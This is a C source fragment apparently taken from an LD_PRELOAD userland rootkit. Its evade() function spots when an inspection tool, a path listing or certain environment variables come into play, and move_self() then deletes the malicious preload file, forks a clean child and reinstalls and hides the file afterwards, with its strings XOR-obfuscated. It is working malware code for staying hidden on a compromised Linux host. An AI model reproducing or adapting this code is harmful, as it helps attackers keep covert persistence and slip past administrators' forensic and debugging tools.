int move_self(void)
{
    if(not_user(0)) return VINVALID_PERM;

    /* rm our preload file so that new processes henceforth
       are clean processes. */
    hook(CUNLINK);
    xor(ldpreload, LDSO_PRELOAD);
    (void)call(CUNLINK, ldpreload);
    clean(ldpreload);

    pid_t pid;
    if((pid = fork()) == -1) return VFORK_ERR;   /* if we can't fork, return error */
    else if(pid == 0) return VFORK_SUC;          /* return VFORK_SUC in the child */

    /* continue in the parent process */
    (void)wait(NULL);
    reinstall();                /* rewrite our preload file */
    xhide_path(LDSO_PRELOAD);   /* and hide it */
    return VEVADE_DONE;
}

int evade(const char *filename, char *const argv[], char *const envp[])
{
    char path[PATH_MAX];

    for(int i = 0; i < SCARY_PROCS_SIZE; i++){
        xor(current_scary_proc, scary_procs[i]);
        (void)snprintf(path, sizeof(path) - 1, "*/%s", current_scary_proc);
        clean(current_scary_proc);

        if(xprocess(scary_procs[i]) || xstrstr(scary_procs[i], filename) ||
            !fnmatch(path, filename, FNM_PATHNAME)) return move_self();
    }

    for(int i = 0; i < SCARY_PATHS_SIZE; i++)
        if(!xfnmatch(scary_paths[i], filename) ||
            xstrstr(scary_paths[i], filename))
            for(int ii = 0; argv[ii] != NULL; ii++)
                if(!strcmp(argv[ii], "--list")) return move_self();

    if(envp != NULL)
        for(int i = 0; envp[i] != NULL; i++)
            for(int ii = 0; ii < SCARY_VARIABLES_SIZE; ii++)
                if(!xstrncmp(scary_variables[ii], envp[i])) return move_self();

    return VNOTHING_DONE;
}